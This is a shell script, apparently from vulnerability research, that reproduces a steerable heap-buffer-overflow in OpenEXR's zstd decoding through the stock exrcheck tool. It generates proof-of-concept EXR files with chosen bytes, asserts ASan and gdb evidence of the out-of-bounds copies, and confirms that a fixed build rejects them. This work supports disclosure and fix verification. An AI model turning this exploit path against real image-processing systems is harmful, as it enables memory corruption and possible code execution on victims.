#!/bin/sh
# W181: W180's file-steered chosen-byte offsets, reached through the UNMODIFIED
# upstream exrcheck -c binary, not only the purpose-built guarded harness.
# Inner frame and chunk leader both size to 2N bytes; the pinned sink copies
# the 4N-byte FLOAT block to offset 0 and the 2N-byte FILE-CHOSEN HALF block to
# destination offset 4N at internal_zstd.c:472. Addresses, PIDs, paths and
# BuildIds are normalized; lengths, offsets and byte values are preserved.
# Requires the gitignored pinned build trees; the baseline generator is built
# locally when absent, so this also runs from a clean git archive.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-w181 evidence

if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    g++ -g -O1 $INC cases/gen_baseline_deep_mixed.cpp $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lm \
        -o bin-vuln-plain/gen_baseline_deep_mixed
fi
bin-vuln-plain/gen_baseline_deep_mixed work-w181/baseline_deep_mixed.exr \
    > /dev/null
test "$(sha256sum work-w181/baseline_deep_mixed.exr | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04

norm() {
    awk '
        { gsub(/==[0-9]+==/, "==PID==") }
        { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
        { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
        { print }
    '
}

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT

run() {
    name=$1
    shift
    set +e
    "$@" > "$RAW" 2>&1
    rc=$?
    set -e
    norm < "$RAW" > "evidence/$name.out"
    printf 'RC=%s\n' "$rc" >> "evidence/$name.out"
}

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr
run exrcheck-steer-asan-baseline ./build-vuln-asan/bin/exrcheck -c \
    work-w181/baseline_deep_mixed.exr
unset ASAN_OPTIONS
run exrcheck-steer-plain-baseline ./build-vuln-plain/bin/exrcheck -c \
    work-w181/baseline_deep_mixed.exr
grep -q '^RC=0$' evidence/exrcheck-steer-asan-baseline.out
grep -q 'OK' evidence/exrcheck-steer-asan-baseline.out
grep -q '^RC=0$' evidence/exrcheck-steer-plain-baseline.out
grep -q 'OK' evidence/exrcheck-steer-plain-baseline.out

for n in 64 128; do
    size=$((2 * n))
    off=$((4 * n))
    case $n in
        64)
            h3c=41f840cbca092dd78c935e47e14b4149e3edac6c59f50de4ef186cd97aa106a6
            h5a=a0d8c88663031e50123af8fa6c814b4a13e7627f0ec5f318272d75bc955ce03b
            plainrc=139
            ;;
        128)
            h3c=38767b7ec757ff6b1b648f359df30c79b0d8e061bb81a155668bc737e3d201bc
            h5a=9f716aec359be8fc9c0c1e48edea2b21c0532d786939f7f437f4659c4b33b8f0
            plainrc=134
            ;;
    esac
    for byte in 3c 5a; do
        eval "want=\$h$byte"
        poc="work-w181/poc_n${n}_${byte}.exr"
        python3 cases/make_poc_mixed.py work-w181/baseline_deep_mixed.exr \
            "$poc" "$n" "0x$byte" > /dev/null
        test "$(sha256sum "$poc" | cut -d' ' -f1)" = "$want"

        export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr
        run "exrcheck-steer-asan-n${n}-${byte}" \
            ./build-vuln-asan/bin/exrcheck -c "$poc"
        unset ASAN_OPTIONS
        run "exrcheck-steer-plain-n${n}-${byte}" \
            ./build-vuln-plain/bin/exrcheck -c "$poc"

        asan="evidence/exrcheck-steer-asan-n${n}-${byte}.out"
        plain="evidence/exrcheck-steer-plain-n${n}-${byte}.out"
        grep -q '^RC=1$' "$asan"
        grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$asan"
        grep -q "READ of size $off" "$asan"
        grep -q 'internal_zstd.c:472' "$asan"
        grep -q 'internal_zstd.c:1335' "$asan"
        grep -q 'exr_decoding_run' "$asan"
        grep -q 'ImfCheckFile.cpp:1467' "$asan"
        grep -q "^RC=$plainrc\$" "$plain"

        # N=128 aborts inside the sink under gdb (512-byte copy into a 256-byte
        # destination), so COPY2 is not observable in the unmodified binary at
        # that N; W180's guarded-harness gdb covers the +512 chosen bytes. The
        # two-copy readback here is asserted for the survivable N=64 case only.
        if [ "$n" -eq 64 ]; then
            gdb -q -batch -ex 'break sort2_4ByteChannels_tiled' \
                -ex "run -c $poc" \
                -x harness/gdb-exrcheck-steer.cmd \
                ./build-vuln-plain/bin/exrcheck 2>&1 \
                | norm > "evidence/exrcheck-steer-gdb-n${n}-${byte}.out"
            g="evidence/exrcheck-steer-gdb-n${n}-${byte}.out"
            grep -q 'SINK-ENTER' "$g"
            grep -q "COPY1 dst=ADDR src=ADDR len=$off dst-out=0 src-in=$size" "$g"
            grep -q "COPY2 dst=ADDR src=ADDR len=$size dst-out=$off src-in=0" "$g"
            grep -q 'internal_zstd.c:472' "$g"
            [ "$(grep -o "0x$byte" "$g" | wc -l)" -ge 24 ]
        fi
    done

    export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr
    run "exrcheck-steer-fixed-n${n}" ./build-fixed-asan/bin/exrcheck -c \
        "work-w181/poc_n${n}_5a.exr"
    unset ASAN_OPTIONS
    f="evidence/exrcheck-steer-fixed-n${n}.out"
    grep -q '^RC=1$' "$f"
    grep -q 'bad' "$f"
    ! grep -q 'ERROR: AddressSanitizer' "$f"
done

printf 'RESULT PASS\n'
sha256sum evidence/exrcheck-steer-*.out
